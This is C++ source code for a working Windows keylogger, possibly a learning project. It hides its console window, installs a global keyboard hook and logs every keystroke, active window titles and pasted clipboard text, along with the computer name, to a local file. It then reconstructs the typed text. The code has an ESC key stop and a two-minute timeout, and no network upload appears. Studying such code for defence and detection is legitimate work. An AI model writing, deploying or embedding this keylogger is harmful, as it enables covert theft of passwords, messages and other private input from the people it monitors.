#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <atomic>
#include <ctime>
#include <wininet.h>
#include <sstream>
#include <filesystem>
#pragma comment(lib, "wininet.lib")
using namespace std;

// Global variables
atomic<bool> running(true);
string lastWindowTitle = "";
ofstream keylogFile;

// This function retrievs the current window title
string GetWindowsTitle() {
    char title[256];
    HWND hwnd = GetForegroundWindow();
    if (hwnd == NULL) return "";
    GetWindowText(hwnd, title, sizeof(title));
    return string(title);
}

// This function retrieves plain text content from the clipboard 
string GetClipboardText() {
    if (!OpenClipboard(nullptr)) return "";
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == nullptr) {
        CloseClipboard();
        return "";
    }

    char* pszText = static_cast<char*>(GlobalLock(hData));
    if (pszText == nullptr) {
        CloseClipboard();
        return "";
    }

    string text(pszText);

    GlobalUnlock(hData);
    CloseClipboard();

    return text;
}

// THis function convert key codes to readable strings
string KeyCodeToString(int keyCode, bool isShiftPressed, bool isCapsLockOn) {
    if (keyCode >= 'A' && keyCode <= 'Z') {
        bool upper = (isCapsLockOn ^ isShiftPressed);
        char letter = upper ? static_cast<char>(keyCode) : static_cast<char>(keyCode + 32);
        return string(1, letter);
    }

    if (keyCode >= '0' && keyCode <= '9') {
        if (isShiftPressed) {
            const char shiftSymbols[] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '('};
            return string(1, shiftSymbols[keyCode - '0']);
        } else {
            return string(1, static_cast<char>(keyCode));
        }
    }

    switch (keyCode) {
        case VK_SPACE: return "[SPACE]";
        case VK_RETURN: return "[ENTER]";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_ESCAPE: return "[ESC]";
        case VK_BACK: return "[BACKSPACE]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        default: return "[KEYCODE " + to_string(keyCode) + "]";
    }
} 

/*
    This function retrieves the all the key pressed by the user
    and logs them to a file. It also detects clipboard pastes and active window changes.
    The keylogger stopped when user presses the ESC key.
*/ 
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0 && wParam == WM_KEYDOWN) {
        const KBDLLHOOKSTRUCT* kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        int keyCode = kbStruct->vkCode;

        bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

        // Log active window change
        string currentWindow = GetWindowsTitle();
        if (currentWindow != lastWindowTitle && !currentWindow.empty()) {
            lastWindowTitle = currentWindow;
            keylogFile << "\n[WINDOW]: " << currentWindow << endl;
            cout << "\n[WINDOW]: " << currentWindow << endl;
        }

        // Detect clipboard paste (Ctrl + V)
        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && keyCode == 'V') {
            string clip = GetClipboardText();
            if (!clip.empty()) {
                keylogFile << "[CLIPBOARD PASTE]: " << clip << endl;
                cout << "[CLIPBOARD PASTE]: " << clip << endl;
            }
        }

        string keyString = KeyCodeToString(keyCode, isShiftPressed, isCapsLockOn);
        cout << "A key has been pressed: " << keyString << endl;
        keylogFile << "A key has been pressed: " << keyString << endl;

       if (keyCode == VK_ESCAPE) {
        running = false;
        keylogFile << "Keylogger stopped by user (ESC)." << endl;
        cout << "Keylogger stopped by user (ESC)." << endl;
        PostQuitMessage(0);  // Force GetMessage loop to exit
        return 1; // Skip further processing of ESC
    }

        // Log the key press
        //file << "A key has been pressed: " << keyString << endl;
        keylogFile.flush(); // Ensure data is written to the file
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}

void keyrunner(int argc, char* argv[]){
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // Hide console window
    
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);

    time_t now = time(0);
    char *dt = ctime(&now);

    ofstream userFile("keylog.txt", ios::out | ios::app);
    if (!userFile) {
        cerr << "Error opening userlog file." << endl;
        return;
    }
    userFile << "Computer Name: " << computerName << endl;
    userFile << "Date and Time: " << dt;
    userFile.flush();   
    userFile.close();

   
    if(argc > 1 && string(argv[1]) == "--show") {
        ShowWindow(GetConsoleWindow(), SW_SHOW); // Show console if --show argument is passed
    }

    keylogFile.open("keylog.txt", ios::out | ios::app);
    if (!keylogFile) {
        cerr << "Error opening keylog file." << endl;
        return;
    }
    keylogFile << "Keylogger started." << endl;
    cout << "Keylogger started." << endl;

    HHOOK event = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (event == NULL) {
        cerr << "Failed to set hook!" << endl;
        return;
    }

    keylogFile << "Keylogger is running. Press ESC to stop or wait 2 minutes..." << endl;

    DWORD startTime = GetTickCount();
    const DWORD duration = 120000; // 2 minutes

    MSG msg;
    while (running && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        if (GetTickCount() - startTime > duration) {
            keylogFile << "Keylogger timed out after 2 minutes." << endl;
            running = false;
        }
    }

    UnhookWindowsHookEx(event);
    keylogFile << "Keylogger stopped." << endl;
    keylogFile.flush();
    keylogFile.close();

    // Read and process log file
    ifstream infile("keylog.txt");
    if (!infile) {
        cerr << "Error opening keylog file." << endl;
        return;
    }

    string line, processedText;
    const string prefix = "A key has been pressed: ";

    while (getline(infile, line)) {
        if (line.find(prefix) == 0) {
            string key = line.substr(prefix.length());

            if (key.length() == 1) {
                processedText += key;
            } else if (key == "[SPACE]") {
                processedText += ' ';
            } else if (key == "[ENTER]") {
                processedText += '\n';
            } else if (key == "[TAB]") {
                processedText += '\t';
            } else if (key == "[BACKSPACE]") {
                if (!processedText.empty())
                    processedText.pop_back();
            }
        }
    }
    //infile.flush();
    infile.close();

    cout << "\nProcessed sequence:\n" << processedText << endl;
    return;
}

int main(int argc, char* argv[]) {
    // Start the keylogger
    keyrunner(argc, argv);
    return 0;
}